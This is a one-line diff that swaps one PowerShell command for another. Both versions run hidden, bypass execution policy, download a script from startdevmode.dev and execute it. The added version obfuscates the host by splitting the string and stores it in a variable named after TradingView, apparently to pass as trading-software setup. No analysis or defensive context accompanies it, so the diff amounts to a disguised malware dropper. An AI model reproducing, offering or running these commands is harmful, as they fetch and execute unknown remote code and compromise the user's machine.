@@ -1,1 +1,1 @@
-powershell -w h -nop -c "$a=$env:USERPROFILE+'\Documents\'+(Get-Date).Ticks+'.ps1';curl http://startdevmode.dev/0FS.lim -o $a;powershell -w h -ep bypass -f $a"
+powershell -command "$TradingView='start'+'devmode.'+'dev/0FS.lim';$f=$env:TEMP+'\'+[guid]::NewGuid().ToString()+'.ps1';[IO.File]::WriteAllText($f,[Text.Encoding]::UTF8.GetString((iwr $TradingView -UseBasicParsing).Content));powershell -w h -ep bypass -f $f"
